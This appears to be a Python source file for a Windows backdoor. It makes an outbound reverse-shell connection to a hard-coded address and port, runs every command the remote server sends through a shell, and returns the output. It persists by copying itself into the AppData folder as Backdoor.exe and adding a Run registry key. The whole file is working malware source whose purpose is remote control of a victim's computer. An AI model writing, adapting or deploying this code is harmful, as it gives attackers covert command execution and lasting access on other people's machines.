#!/usr/bin/python
import socket
import json
import subprocess
import time
import sys
import os
import shutil

#relaible_recv fun. allows us to recieve large bytes of data without the program breaking 
def relaible_recv():
	global json_data 
	json_data=""
	while True:
		try:
			json_data=json_data + str(sock.recv(1024))
			return json.loads(json_data)
		except ValueError:
			continue

def relaible_send(data):
	json.dumps(data)
	sock.send(json_data)

#shell fun. allows us to recive the commands fromthe server and process them to execute in the terminal
def shell():
	while True:
		command=relaible_recv()
		if command=='q':
			break
		else:
			try:
				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result=proc.stdout.read()+proc.stderr.read()
				relaible_send(result)

			except:
				print("[!!]Can't execute the command "+command)


#connection fun. connects us to the server 
def connection():
	while True:
		time.sleep(30)
		try:
			sock.connect(("192.168.1.9",54321))
			shell()
		except:
			connection()
		
location=os.environ["appdata"]+"\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v reverse_shell /t REG_SZ /d"'+location+'"', shell=True)

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
